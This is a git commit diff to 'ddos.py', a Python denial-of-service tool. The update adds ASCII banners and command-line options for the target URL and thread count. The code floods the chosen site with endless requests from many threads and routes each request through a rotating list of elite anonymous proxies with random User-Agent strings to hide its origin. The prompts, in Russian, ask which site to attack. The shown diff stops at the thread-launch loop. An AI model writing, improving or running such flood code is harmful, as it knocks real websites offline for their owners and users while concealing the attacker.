c7cff7c986c6a47337427b95ff08bd2103ee1a80
DIMNISSV <54226664+DIMNISSV@users.noreply.github.com>
2021-03-16 17:24:17 +0600

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,41 +1,105 @@
+import argparse
+
 from urllib.request import urlopen, Request
 from threading import Thread
 from random import choice
+from sys import argv
 
 from proxyscan import ProxyScanIO
 from fake_useragent import UserAgent
 
 url, thr = '', 0
 
-print('Автор: dimnissv')
-while url == '' or thr == 0:
-    url = input('На какой URL ломиться?: ')
+banner = '''
+@@@@@@@              @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
+@@@@@@@@             @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
+@@!  @@@             @@!  @@@  @@!  @@@  @@!  @@@  !@@       
+!@!  @!@             !@!  @!@  !@!  @!@  !@!  @!@  !@!       
+@!@  !@!  @!@!@!@!@  @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
+!@!  !!!  !!!@!@!!!  !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
+!!:  !!!             !!:  !!!  !!:  !!!  !!:  !!!       !:!  
+:!:  !:!             :!:  !:!  :!:  !:!  :!:  !:!      !:!   
+ :::: ::              :::: ::   :::: ::  ::::: ::  :::: ::   
+:: :  :              :: :  :   :: :  :    : :  :   :: : :    
+
+Author: dimnissv
+'''
+
+banner2 = '''
+ __      __   __   __   __  
+|  \ __ |  \ |  \ /  \ /__` 
+|__/    |__/ |__/ \__/ .__/ 
+                             
+Author: dimnissv
+'''
+
+banner3 = '''
+============================================================
+=       =============       ===       =====    =====      ==
+=  ====  ============  ====  ==  ====  ===  ==  ===  ====  =
+=  ====  ============  ====  ==  ====  ==  ====  ==  ====  =
+=  ====  ============  ====  ==  ====  ==  ====  ===  ======
+=  ====  ==        ==  ====  ==  ====  ==  ====  =====  ====
+=  ====  ============  ====  ==  ====  ==  ====  =======  ==
+=  ====  ============  ====  ==  ====  ==  ====  ==  ====  =
+=  ====  ============  ====  ==  ====  ===  ==  ===  ====  =
+=       =============       ===       =====    =====      ==
+============================================================
+
+Author: dimnissv
+'''
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--url', help='URL to attac', type=str)
+parser.add_argument('--thr', help='How many theard use', type=int)
+args = parser.parse_args()
+if args.url and args.thr:
+    url = args.url
+    thr = args.thr
+elif args.url:
+    print(banner2)
+    url = args.url
     thr = int(input('Сколько использовать потоков?: '))
-if 'http://' in url:
-    protocol = 'http'
-elif 'https://' in url:
-    protocol = 'https'
+elif args.thr:
+    print(banner2)
+    thr = args.thr
+    url = input('Какой сайт атаковать?: ')
 else:
-    url = f'http://{url}'
+    print(choice((banner, banner3)))
+    while url == '' or thr == 0:
+        url = input('Какой сайт атаковать?: ')
+        thr = int(input('Сколько использовать потоков?: '))
+
+protocol = url.split(':', 1)
+
+if len(protocol) < 2:
     protocol = 'http'
+    url = 'http://' + url.strip('//')
+else:
+    protocol = protocol[0]
+
 
 ps = ProxyScanIO()
 ua = UserAgent()
-head = {'User-Agent': ua.random}
-proxies = ps.get_Proxies(type=protocol, level='elite')
+proxies = ps.get_Proxies(type=protocol, level='elite', count=100)
 
 
 def gotosite():
     while 1:
-        proxy_host = choice(proxies)
-        print(proxy_host)
+        head = {'User-Agent': ua.random}
         try:
+            proxy_host = choice(proxies)
             req = Request(url, headers=head)
             req.set_proxy(proxy_host, protocol)
             resp = urlopen(req, timeout=3.5)
-            print(str(resp.getcode()) + 'Отакован!')
-        except:
-            pass
+            code = resp.getcode()
+        except Exception as resp:
+            if hasattr(resp, "getcode"):
+                code = resp.getcode()
+            else:
+                code = 'Err'
+        print(code, 'Запрос отправлен с IP:', proxy_host)
+        
 
 
 for _ in range(thr):
